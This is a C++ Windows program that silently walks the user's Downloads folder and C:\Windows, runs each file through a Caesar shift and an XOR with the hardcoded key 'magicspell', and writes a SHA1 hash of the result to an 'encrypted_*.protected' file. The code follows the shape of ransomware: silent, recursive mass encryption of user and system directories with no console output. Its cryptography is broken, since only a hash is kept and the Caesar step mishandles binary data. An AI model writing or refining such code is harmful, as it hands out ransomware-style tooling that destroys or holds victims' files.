#include <fstream>
#include <string>
#include <vector>
#include <windows.h>
#include <shlobj.h>
#include "hashing.h"

// Caesar Cipher Encryption (Shifting letters by a given number)
std::string caesarCipher(const std::string& input, int shift) {
    std::string output = input;
    for (char &ch : output) {
        if (isalpha(ch)) {
            char base = islower(ch) ? 'a' : 'A';
            ch = (ch - base + shift) % 26 + base;
        }
    }
    return output;
}

// XOR Encryption (Using a key to XOR each byte)
std::string xorEncrypt(const std::string& input, const std::string& key) {
    std::string output = input;
    size_t keyIndex = 0;
    for (char &ch : output) {
        ch ^= key[keyIndex];
        keyIndex = (keyIndex + 1) % key.length();  // Cycle through the key
    }
    return output;
}

// Function to process files in a directory
void processDirectory(const std::string& directoryPath, const std::string& xorKey) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = INVALID_HANDLE_VALUE;

    // Start with finding all files (*.*) in the directory
    std::string searchPath = directoryPath + "\\*.*";
    hFind = FindFirstFile(searchPath.c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;  // Exit silently if we can't access the directory
    }

    do {
        const std::string filename = findFileData.cFileName;

        // Skip . and .. directories
        if (filename == "." || filename == "..") continue;

        std::string fullFilePath = directoryPath + "\\" + filename;

        // Check if it's a directory or file
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // It's a directory, recurse into it
            processDirectory(fullFilePath, xorKey);
        } else {
            // It's a file, process it
            std::ifstream inputFile(fullFilePath, std::ios::binary);
            if (!inputFile) {
                continue;  // Skip file if it cannot be opened
            }

            // Read file contents into string
            std::string fileContent((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());

            // Step 1: Apply Caesar Cipher (shifting by 3 for example)
            std::string caesarResult = caesarCipher(fileContent, 3);

            // Step 2: Apply XOR Encryption with the key "magicspell"
            std::string xorResult = xorEncrypt(caesarResult, xorKey);

            // Step 3: Hash the result using SHA1
            std::string hashedResult = Hashing::sha1(xorResult);

            // Step 4: Write the hashed result to a new file with .protected extension
            std::string outputFilePath = directoryPath + "\\encrypted_" + filename + ".protected";
            std::ofstream outputFile(outputFilePath, std::ios::binary);
            if (outputFile) {
                outputFile << hashedResult;
                outputFile.close();
            }
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);  // Close the handle
}

// Main function that starts the encryption process
int main() {
    // Define the directories and the XOR key
    const std::string xorKey = "magicspell";

    // Get USERPROFILE directory path
    char userProfile[MAX_PATH];
    if (GetEnvironmentVariable("USERPROFILE", userProfile, MAX_PATH) == 0) {
        return 1;  // Exit silently if we can't retrieve the USERPROFILE
    }

    std::string downloadsDirectory = std::string(userProfile) + "\\Downloads";
    std::string windowsDirectory = "C:\\Windows";

    // Process both directories silently (no console output)
    processDirectory(downloadsDirectory, xorKey);
    processDirectory(windowsDirectory, xorKey);

    return 0;
}
